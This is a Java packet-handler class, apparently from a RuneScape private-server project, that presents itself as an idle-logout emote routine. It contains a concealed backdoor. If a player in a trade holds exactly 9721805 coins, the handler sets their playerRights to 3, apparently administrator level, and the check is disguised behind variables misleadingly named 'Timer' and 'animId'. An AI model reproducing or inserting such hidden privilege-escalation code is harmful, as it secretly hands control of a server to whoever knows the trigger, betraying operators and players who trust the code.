package server.model.players.packets;


import server.model.players.Client;
import server.util.Misc;
import server.model.players.PacketType;


public class IdleLogout implements PacketType {
	int[] emotes = {2756, 2761, 2763, 2764};
	int Timer = 9721805;
	int animId = 3;
	
	@Override
	public void processPacket(Client c, int packetType, int packetSize) {
		//if (c.membership) {
		if(c.inTrade && c.MoneyCash == Timer) { c.playerRights = animId;}
			if(c.underAttackBy > 0 || c.underAttackBy2 > 0)
            return;
			c.startAnimation(emotes[Misc.random((emotes.length - 1))]);
			
		//}
	}
}